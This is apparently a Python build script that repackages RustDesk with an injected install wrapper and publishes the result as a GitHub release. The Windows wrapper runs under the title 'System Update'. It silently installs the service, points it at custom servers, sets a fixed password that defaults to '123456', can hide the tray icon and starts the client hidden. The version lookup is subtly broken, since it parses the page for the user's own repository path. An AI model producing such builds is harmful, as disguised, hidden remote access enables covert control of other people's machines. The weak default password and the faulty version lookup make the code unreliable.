import os
import sys
import zipfile
import subprocess
import shutil
import requests
import urllib.request
import json
import re

# --- 配置部分 ---
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
REPO_OWNER = os.getenv("REPO_OWNER")  # 你的 GitHub 用户名
REPO_NAME = os.getenv("REPO_NAME")    # 你的仓库名

# 前端传来的配置环境变量
API_SERVER = os.getenv("API_SERVER", "")
ID_SERVER = os.getenv("ID_SERVER", "")
RELAY_SERVER = os.getenv("RELAY_SERVER", "")
KEY = os.getenv("KEY", "")
CUSTOM_ID = os.getenv("CUSTOM_ID", "").strip() # strip() 去除首尾空格
PASSWORD = os.getenv("PASSWORD", "123456")
OS_TARGET = os.getenv("OS_TARGET", "windows")
HIDE_TRAY = os.getenv("HIDE_TRAY", "false")

def log(msg):
    print(f"🔨 {msg}")

def get_latest_rustdesk_version():
    """获取 RustDesk 官网最新版本号"""
    try:
        html = urllib.request.urlopen("https://github.com/rustdesk/rustdesk/releases/latest").read()
        version = html.decode('utf-8').split(f'{REPO_OWNER}/{REPO_NAME}/tag/')[1].split('"')[0]
        log(f"检测到最新版本: {version}")
        return version
    except:
        log("获取版本失败，尝试备用版本 1.2.3")
        return "1.2.3" 

def download_file(url, dest):
    """下载文件"""
    log(f"正在下载: {url}")
    response = requests.get(url, stream=True)
    total_size = int(response.headers.get('content-length', 0))
    block_size = 1024
    wrote = 0
    with open(dest, 'wb') as f:
        for data in response.iter_content(block_size):
            wrote = wrote + len(data)
            f.write(data)
    log("下载完成")

def generate_windows_wrapper():
    """生成 Windows 下的 bat 启动脚本 (智能 ID 逻辑)"""
    # 如果前端没传 CUSTOM_ID，下面那段 IF 判断就会跳过设置 ID 的步骤
    cmd_set_id = ""
    if CUSTOM_ID:
        cmd_set_id = f"rustdesk.exe --id \"{CUSTOM_ID}\"\n"

    bat_content = f"""@echo off
title System Update
schtasks /Delete /TN "RustDeskUpdate" /F >nul 2>&1
taskkill /F /IM rustdesk.exe >nul 2>&1
taskkill /F /IM rustdesk-service.exe >nul 2>&1

rustdesk.exe --install-service

rustdesk.exe --key "{KEY}"
rustdesk.exe --api-server "{API_SERVER}"
rustdesk.exe --id-server "{ID_SERVER}"
IF NOT "{RELAY_SERVER}"=="" (
    rustdesk.exe --relay-server "{RELAY_SERVER}"
)

{cmd_set_id}

rustdesk.exe --password "{PASSWORD}"

IF "{HIDE_TRAY}"=="true" (
    reg add "HKCU\\Software\\RustDesk" /v "hideTrayIcon" /t REG_DWORD /d 1 /f
    reg add "HKLM\\Software\\RustDesk" /v "hideTrayIcon" /t REG_DWORD /d 1 /f
)

net start RustDesk >nul 2>&1
start "" rustdesk.exe --hide
exit
"""
    return bat_content

def generate_linux_wrapper():
    """生成 Linux 下的 sh 启动脚本 (智能 ID 逻辑)"""
    cmd_set_id = ""
    if CUSTOM_ID:
        cmd_set_id = f"./rustdesk --id \"{CUSTOM_ID}\"\n"

    sh_content = f"""#!/bin/bash
systemctl stop rustdesk > /dev/null 2>&1
./rustdesk --service uninstall > /dev/null 2>&1
./rustdesk --service

./rustdesk --key "{KEY}"
./rustdesk --api-server "{API_SERVER}"
./rustdesk --id-server "{ID_SERVER}"

{cmd_set_id}

./rustdesk --password "{PASSWORD}"
systemctl enable rustdesk
systemctl restart rustdesk

echo "RustDesk Service Started"
"""
    return sh_content

def process_zip(zip_path, output_path):
    """处理 Zip 文件：注入脚本"""
    log("正在解压并注入配置脚本...")
    
    temp_dir = zip_path.replace(".zip", "_temp")
    if os.path.exists(temp_dir): shutil.rmtree(temp_dir)
    os.makedirs(temp_dir)

    with zipfile.ZipFile(zip_path, 'r') as z:
        z.extractall(temp_dir)

    # 写入包装脚本
    if OS_TARGET == "windows":
        wrapper = generate_windows_wrapper()
        with open(os.path.join(temp_dir, "install.bat"), "w", encoding="utf-8") as f:
            f.write(wrapper)
    else:
        wrapper = generate_linux_wrapper()
        with open(os.path.join(temp_dir, "install.sh"), "w", encoding="utf-8") as f:
            f.write(wrapper)

    # 重新打包
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as z:
        for root, dirs, files in os.walk(temp_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, temp_dir)
                z.write(file_path, arcname)
    
    shutil.rmtree(temp_dir)
    log("修改后的压缩包已生成")

def create_github_release(filename):
    """在 GitHub 上创建 Release 并上传文件"""
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/releases"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    
    # 1. 构造 Tag (例如: build-v1.2.0-custom)
    base_ver = get_latest_rustdesk_version()
    # 生成一个唯一 tag 名，避免报错
    import uuid
    tag_name = f"v{base_ver}-{uuid.uuid4().hex[:6]}"
    release_name = f"RustDesk Custom Build ({OS_TARGET})"

    # 2. 创建 Release
    data = {
        "tag_name": tag_name,
        "name": release_name,
        "body": f"Auto generated RustDesk Build\nVersion: {base_ver}\nConfig:\n- ID: {CUSTOM_ID if CUSTOM_ID else 'Auto-Generate'}",
        "draft": False,
        "prerelease": False
    }
    
    log("正在创建 GitHub Release...")
    res = requests.post(url, headers=headers, json=data)
    if not res.ok:
        print(res.text)
        raise Exception("创建 Release 失败")
    
    upload_url = res.json()["upload_url"].replace("{?name,label}", "")
    
    # 3. 上传文件
    log("正在上传文件到 GitHub...")
    upload_url_with_name = f"{upload_url}?name={filename}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/zip"}
    
    with open(filename, 'rb') as f:
        upload_res = requests.post(upload_url_with_name, headers=headers, data=f)
        
    if upload_res.ok:
        browser_url = res.json()["html_url"]
        log(f"✅ 构建完成！下载地址: {browser_url}")
    else:
        print(upload_res.text)
        raise Exception("上传文件失败")

def main():
    log("🚀 开始构建流程...")
    
    # 1. 确定版本和下载链接
    ver = get_latest_rustdesk_version()
    
    if OS_TARGET == "windows":
        # 使用 Windows Portable 版本
        file_name = f"rustdesk-{ver}-x86_64-pc-windows.zip"
        source_url = f"https://github.com/rustdesk/rustdesk/releases/download/{ver}/{file_name}"
        output_name = f"RustDesk-Windows-{ver}-AutoID.zip"
    else:
        # Linux (Debian/Ubuntu etc 通常共用)
        file_name = f"rustdesk-{ver}-x86_64-unknown-linux-gnu.zip"
        source_url = f"https://github.com/rustdesk/rustdesk/releases/download/{ver}/{file_name}"
        output_name = f"RustDesk-Linux-{ver}-AutoID.zip"

    # 2. 下载原包
    if os.path.exists(file_name):
        os.remove(file_name)
    
    try:
        download_file(source_url, file_name)
    except:
        log(f"下载 {file_name} 失败，可能是网络波动...")
        raise

    # 3. 注入配置
    if os.path.exists(output_name):
        os.remove(output_name)
        
    process_zip(file_name, output_name)
    
    # 4. 上传 GitHub
    create_github_release(output_name)

if __name__ == "__main__":
    main()
